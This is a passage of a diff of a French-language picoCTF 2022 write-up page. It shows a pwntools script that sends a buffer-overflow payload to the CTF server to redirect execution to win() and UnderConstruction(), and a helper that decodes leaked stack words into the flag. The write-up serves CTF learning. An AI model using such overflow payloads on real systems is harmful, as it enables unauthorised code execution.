+	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Names of user: %p %p %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span><span class="n">q</span><span class="p">,</span><span class="n">r</span><span class="p">);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Age of user: %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">age</span><span class="p">);</span>
+        <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>La fonction <strong>UnderConstruction()</strong> fera l&rsquo;affaire.</p>
+<p>Il suffit maintenant de rédirigé le flux d&rsquo;exécution vers la fonction <strong>win()</strong> ensuite vers la fontion <strong>UnderConstruction()</strong>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;saturn.picoctf.net&#39;</span><span class="p">,</span> <span class="mi">56141</span><span class="p">)</span>
+
+<span class="n">rip</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08049da0</span><span class="p">)</span> <span class="c1"># win()</span>
+<span class="n">esp</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08049e20</span><span class="p">)</span> <span class="c1"># UnderConstruction()</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Give me a string that gets you the flag&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="p">(</span><span class="mi">10</span> <span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">rip</span> <span class="o">+</span> <span class="n">esp</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="datas/stackcache.png"
+        data-srcset="/fr/picoctf2022-writeup/datas/stackcache.png, datas/stackcache.png 1.5x, /fr/picoctf2022-writeup/datas/stackcache.png 2x"
+        data-sizes="auto"
+        alt="/fr/picoctf2022-writeup/datas/stackcache.png"
+        title="stack cache" /></p>
+<p>J&rsquo;ai écrit un script python pour çà.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">binascii</span> <span class="kn">import</span> <span class="n">unhexlify</span>
+
+<span class="n">cache</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;080c9a04&#39;</span><span class="p">,</span> <span class="s1">&#39;0804007d&#39;</span><span class="p">,</span> <span class="s1">&#39;61333337&#39;</span><span class="p">,</span> <span class="s1">&#39;31646239&#39;</span><span class="p">,</span> <span class="s1">&#39;5f597230&#39;</span><span class="p">,</span> <span class="s1">&#39;6d334d5f&#39;</span><span class="p">,</span> <span class="s1">&#39;50755f4e&#39;</span><span class="p">,</span> <span class="s1">&#39;34656c43&#39;</span><span class="p">,</span> <span class="s1">&#39;7b465443&#39;</span><span class="p">,</span> <span class="s1">&#39;6f636970&#39;</span><span class="p">]</span>
+<span class="n">flag</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+<span class="k">for</span> <span class="n">pin</span> <span class="ow">in</span> <span class="n">cache</span><span class="p">:</span>
+	<span class="k">try</span><span class="p">:</span>
+		<span class="n">flag</span> <span class="o">+=</span> <span class="n">unhexlify</span><span class="p">(</span><span class="n">pin</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+	<span class="k">except</span><span class="p">:</span><span class="k">pass</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+</code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
     <div class="post-info">
         <div class="post-info-line">
             <div class="post-info-mod">
@@ -138,7 +1023,7 @@
                             <a class="link-to-markdown" href="/fr/picoctf2022-writeup/index.md" target="_blank">Lire Markdown</a>
                         </span></div>
             <div class="post-info-share">
-                <span><a href="javascript:void(0);" title="Partager sur Twitter" data-sharer="twitter" data-url="https://w31rdr4v3n.github.io/fr/picoctf2022-writeup/" data-title="picoCTF2022 Writeup" data-via="w31rdr4v3n" data-hashtags="picoCTF,pwn,reverse,crypto,forensic"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Partager sur Facebook" data-sharer="facebook" data-url="https://w31rdr4v3n.github.io/fr/picoctf2022-writeup/" data-hashtag="picoCTF"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Partager sur Linkedin" data-sharer="linkedin" data-url="https://w31rdr4v3n.github.io/fr/picoctf2022-writeup/"><i class="fab fa-linkedin fa-fw"></i></a><a href="javascript:void(0);" title="Partager sur WhatsApp" data-sharer="whatsapp" data-url="https://w31rdr4v3n.github.io/fr/picoctf2022-writeup/" data-title="picoCTF2022 Writeup" data-web><i class="fab fa-whatsapp fa-fw"></i></a><a href="javascript:void(0);" title="Partager sur Hacker News" data-sharer="hackernews" data-url="https://w31rdr4v3n.github.io/fr/picoctf2022-writeup/" data-title="picoCTF2022 Writeup"><i class="fab fa-hacker-news fa-fw"></i></a><a href="javascript:void(0);" title="Partager sur Line" data-sharer="line" data-url="https://w31rdr4v3n.github.io/fr/picoctf2022-writeup/" data-title="picoCTF2022 Writeup"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@2.14.0/icons/line.svg"></i></a><a href="javascript:void(0);" title="Partager sur 微博" data-sharer="weibo" data-url="https://w31rdr4v3n.github.io/fr/picoctf2022-writeup/" data-title="picoCTF2022 Writeup" data-image="picoctf-logo-social.png"><i class="fab fa-weibo fa-fw"></i></a></span>
+                <span><a href="javascript:void(0);" title="Partager sur Twitter" data-sharer="twitter" data-url="https://w31rdr4v3n.github.io/fr/picoctf2022-writeup/" data-title="picoCTF2022 Writeup" data-via="w31rdr4v3n" data-hashtags="picoCTF,pwn,reverse,crypto,forensic"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Partager sur Facebook" data-sharer="facebook" data-url="https://w31rdr4v3n.github.io/fr/picoctf2022-writeup/" data-hashtag="picoCTF"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Partager sur Linkedin" data-sharer="linkedin" data-url="https://w31rdr4v3n.github.io/fr/picoctf2022-writeup/"><i class="fab fa-linkedin fa-fw"></i></a><a href="javascript:void(0);" title="Partager sur WhatsApp" data-sharer="whatsapp" data-url="https://w31rdr4v3n.github.io/fr/picoctf2022-writeup/" data-title="picoCTF2022 Writeup" data-web><i class="fab fa-whatsapp fa-fw"></i></a><a href="javascript:void(0);" title="Partager sur Hacker News" data-sharer="hackernews" data-url="https://w31rdr4v3n.github.io/fr/picoctf2022-writeup/" data-title="picoCTF2022 Writeup"><i class="fab fa-hacker-news fa-fw"></i></a></span>
             </div>
         </div>
     </div>
@@ -166,5 +1051,5 @@
             </a><a href="#" id="view-comments" class="fixed-button" title="Afficher les Commentaires">
                 <i class="fas fa-comment fa-fw"></i>
             </a>
-        </div><link rel="stylesheet" href="/lib/valine/valine.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/css/lightgallery.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/js/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-thumbnail.js@1.2.0/dist/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-zoom.js@1.2.0/dist/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.4.0/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copier dans le presse-papiers","maxShownLines":10},"comment":{"valine":{"appId":"QGzwQXOqs5JOhN4RGPOkR2mR-MdYXbMMI","appKey":"WBmoGyJtbqUswvfLh6L8iEBr","avatar":"mp","el":"#valine","emojiCDN":"https://cdn.jsdelivr.net/npm/emoji-datasource-google@5.0.1/img/google/64/","emojiMaps":{"100":"1f4af.png","alien":"1f47d.png","anger":"1f4a2.png","angry":"1f620.png","anguished":"1f627.png","astonished":"1f632.png","black_heart":"1f5a4.png","blue_heart":"1f499.png","blush":"1f60a.png","bomb":"1f4a3.png","boom":"1f4a5.png","broken_heart":"1f494.png","brown_heart":"1f90e.png","clown_face":"1f921.png","cold_face":"1f976.png","cold_sweat":"1f630.png","confounded":"1f616.png","confused":"1f615.png","cry":"1f622.png","crying_cat_face":"1f63f.png","cupid":"1f498.png","dash":"1f4a8.png","disappointed":"1f61e.png","disappointed_relieved":"1f625.png","dizzy":"1f4ab.png","dizzy_face":"1f635.png","drooling_face":"1f924.png","exploding_head":"1f92f.png","expressionless":"1f611.png","face_vomiting":"1f92e.png","face_with_cowboy_hat":"1f920.png","face_with_hand_over_mouth":"1f92d.png","face_with_head_bandage":"1f915.png","face_with_monocle":"1f9d0.png","face_with_raised_eyebrow":"1f928.png","face_with_rolling_eyes":"1f644.png","face_with_symbols_on_mouth":"1f92c.png","face_with_thermometer":"1f912.png","fearful":"1f628.png","flushed":"1f633.png","frowning":"1f626.png","ghost":"1f47b.png","gift_heart":"1f49d.png","green_heart":"1f49a.png","grimacing":"1f62c.png","grin":"1f601.png","grinning":"1f600.png","hankey":"1f4a9.png","hear_no_evil":"1f649.png","heart":"2764-fe0f.png","heart_decoration":"1f49f.png","heart_eyes":"1f60d.png","heart_eyes_cat":"1f63b.png","heartbeat":"1f493.png","heartpulse":"1f497.png","heavy_heart_exclamation_mark_ornament":"2763-fe0f.png","hole":"1f573-fe0f.png","hot_face":"1f975.png","hugging_face":"1f917.png","hushed":"1f62f.png","imp":"1f47f.png","innocent":"1f607.png","japanese_goblin":"1f47a.png","japanese_ogre":"1f479.png","joy":"1f602.png","joy_cat":"1f639.png","kiss":"1f48b.png","kissing":"1f617.png","kissing_cat":"1f63d.png","kissing_closed_eyes":"1f61a.png","kissing_heart":"1f618.png","kissing_smiling_eyes":"1f619.png","laughing":"1f606.png","left_speech_bubble":"1f5e8-fe0f.png","love_letter":"1f48c.png","lying_face":"1f925.png","mask":"1f637.png","money_mouth_face":"1f911.png","nauseated_face":"1f922.png","nerd_face":"1f913.png","neutral_face":"1f610.png","no_mouth":"1f636.png","open_mouth":"1f62e.png","orange_heart":"1f9e1.png","partying_face":"1f973.png","pensive":"1f614.png","persevere":"1f623.png","pleading_face":"1f97a.png","pouting_cat":"1f63e.png","purple_heart":"1f49c.png","rage":"1f621.png","relaxed":"263a-fe0f.png","relieved":"1f60c.png","revolving_hearts":"1f49e.png","right_anger_bubble":"1f5ef-fe0f.png","robot_face":"1f916.png","rolling_on_the_floor_laughing":"1f923.png","scream":"1f631.png","scream_cat":"1f640.png","see_no_evil":"1f648.png","shushing_face":"1f92b.png","skull":"1f480.png","skull_and_crossbones":"2620-fe0f.png","sleeping":"1f634.png","sleepy":"1f62a.png","slightly_frowning_face":"1f641.png","slightly_smiling_face":"1f642.png","smile":"1f604.png","smile_cat":"1f638.png","smiley":"1f603.png","smiley_cat":"1f63a.png","smiling_face_with_3_hearts":"1f970.png","smiling_imp":"1f608.png","smirk":"1f60f.png","smirk_cat":"1f63c.png","sneezing_face":"1f927.png","sob":"1f62d.png","space_invader":"1f47e.png","sparkling_heart":"1f496.png","speak_no_evil":"1f64a.png","speech_balloon":"1f4ac.png","star-struck":"1f929.png","stuck_out_tongue":"1f61b.png","stuck_out_tongue_closed_eyes":"1f61d.png","stuck_out_tongue_winking_eye":"1f61c.png","sunglasses":"1f60e.png","sweat":"1f613.png","sweat_drops":"1f4a6.png","sweat_smile":"1f605.png","thinking_face":"1f914.png","thought_balloon":"1f4ad.png","tired_face":"1f62b.png","triumph":"1f624.png","two_hearts":"1f495.png","unamused":"1f612.png","upside_down_face":"1f643.png","weary":"1f629.png","white_frowning_face":"2639-fe0f.png","white_heart":"1f90d.png","wink":"1f609.png","woozy_face":"1f974.png","worried":"1f61f.png","yawning_face":"1f971.png","yellow_heart":"1f49b.png","yum":"1f60b.png","zany_face":"1f92a.png","zipper_mouth_face":"1f910.png","zzz":"1f4a4.png"},"enableQQ":false,"highlight":true,"lang":"en","pageSize":10,"placeholder":"Votre commentaire ...","recordIP":true,"serverURLs":"https://leancloud.hugoloveit.com","visitor":true}},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+        </div><link rel="stylesheet" href="/lib/valine/valine.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/css/lightgallery.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/js/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-thumbnail.js@1.2.0/dist/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-zoom.js@1.2.0/dist/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.4.0/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copier dans le presse-papiers","maxShownLines":10},"comment":{"valine":{"appId":"dau7YgRPdSUurYQ8F5vJY1NH-MdYXbMMI","appKey":"h5m3dql66xHK3mf0WAGVJLgR","avatar":"mp","el":"#valine","emojiCDN":"https://cdn.jsdelivr.net/npm/emoji-datasource-google@5.0.1/img/google/64/","emojiMaps":{"100":"1f4af.png","alien":"1f47d.png","anger":"1f4a2.png","angry":"1f620.png","anguished":"1f627.png","astonished":"1f632.png","black_heart":"1f5a4.png","blue_heart":"1f499.png","blush":"1f60a.png","bomb":"1f4a3.png","boom":"1f4a5.png","broken_heart":"1f494.png","brown_heart":"1f90e.png","clown_face":"1f921.png","cold_face":"1f976.png","cold_sweat":"1f630.png","confounded":"1f616.png","confused":"1f615.png","cry":"1f622.png","crying_cat_face":"1f63f.png","cupid":"1f498.png","dash":"1f4a8.png","disappointed":"1f61e.png","disappointed_relieved":"1f625.png","dizzy":"1f4ab.png","dizzy_face":"1f635.png","drooling_face":"1f924.png","exploding_head":"1f92f.png","expressionless":"1f611.png","face_vomiting":"1f92e.png","face_with_cowboy_hat":"1f920.png","face_with_hand_over_mouth":"1f92d.png","face_with_head_bandage":"1f915.png","face_with_monocle":"1f9d0.png","face_with_raised_eyebrow":"1f928.png","face_with_rolling_eyes":"1f644.png","face_with_symbols_on_mouth":"1f92c.png","face_with_thermometer":"1f912.png","fearful":"1f628.png","flushed":"1f633.png","frowning":"1f626.png","ghost":"1f47b.png","gift_heart":"1f49d.png","green_heart":"1f49a.png","grimacing":"1f62c.png","grin":"1f601.png","grinning":"1f600.png","hankey":"1f4a9.png","hear_no_evil":"1f649.png","heart":"2764-fe0f.png","heart_decoration":"1f49f.png","heart_eyes":"1f60d.png","heart_eyes_cat":"1f63b.png","heartbeat":"1f493.png","heartpulse":"1f497.png","heavy_heart_exclamation_mark_ornament":"2763-fe0f.png","hole":"1f573-fe0f.png","hot_face":"1f975.png","hugging_face":"1f917.png","hushed":"1f62f.png","imp":"1f47f.png","innocent":"1f607.png","japanese_goblin":"1f47a.png","japanese_ogre":"1f479.png","joy":"1f602.png","joy_cat":"1f639.png","kiss":"1f48b.png","kissing":"1f617.png","kissing_cat":"1f63d.png","kissing_closed_eyes":"1f61a.png","kissing_heart":"1f618.png","kissing_smiling_eyes":"1f619.png","laughing":"1f606.png","left_speech_bubble":"1f5e8-fe0f.png","love_letter":"1f48c.png","lying_face":"1f925.png","mask":"1f637.png","money_mouth_face":"1f911.png","nauseated_face":"1f922.png","nerd_face":"1f913.png","neutral_face":"1f610.png","no_mouth":"1f636.png","open_mouth":"1f62e.png","orange_heart":"1f9e1.png","partying_face":"1f973.png","pensive":"1f614.png","persevere":"1f623.png","pleading_face":"1f97a.png","pouting_cat":"1f63e.png","purple_heart":"1f49c.png","rage":"1f621.png","relaxed":"263a-fe0f.png","relieved":"1f60c.png","revolving_hearts":"1f49e.png","right_anger_bubble":"1f5ef-fe0f.png","robot_face":"1f916.png","rolling_on_the_floor_laughing":"1f923.png","scream":"1f631.png","scream_cat":"1f640.png","see_no_evil":"1f648.png","shushing_face":"1f92b.png","skull":"1f480.png","skull_and_crossbones":"2620-fe0f.png","sleeping":"1f634.png","sleepy":"1f62a.png","slightly_frowning_face":"1f641.png","slightly_smiling_face":"1f642.png","smile":"1f604.png","smile_cat":"1f638.png","smiley":"1f603.png","smiley_cat":"1f63a.png","smiling_face_with_3_hearts":"1f970.png","smiling_imp":"1f608.png","smirk":"1f60f.png","smirk_cat":"1f63c.png","sneezing_face":"1f927.png","sob":"1f62d.png","space_invader":"1f47e.png","sparkling_heart":"1f496.png","speak_no_evil":"1f64a.png","speech_balloon":"1f4ac.png","star-struck":"1f929.png","stuck_out_tongue":"1f61b.png","stuck_out_tongue_closed_eyes":"1f61d.png","stuck_out_tongue_winking_eye":"1f61c.png","sunglasses":"1f60e.png","sweat":"1f613.png","sweat_drops":"1f4a6.png","sweat_smile":"1f605.png","thinking_face":"1f914.png","thought_balloon":"1f4ad.png","tired_face":"1f62b.png","triumph":"1f624.png","two_hearts":"1f495.png","unamused":"1f612.png","upside_down_face":"1f643.png","weary":"1f629.png","white_frowning_face":"2639-fe0f.png","white_heart":"1f90d.png","wink":"1f609.png","woozy_face":"1f974.png","worried":"1f61f.png","yawning_face":"1f971.png","yellow_heart":"1f49b.png","yum":"1f60b.png","zany_face":"1f92a.png","zipper_mouth_face":"1f910.png","zzz":"1f4a4.png"},"enableQQ":false,"highlight":true,"lang":"en","pageSize":10,"placeholder":"Votre commentaire ...","recordIP":true,"serverURLs":"https://dau7ygrp.api.lncldglobal.com","visitor":true}},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
 </html>
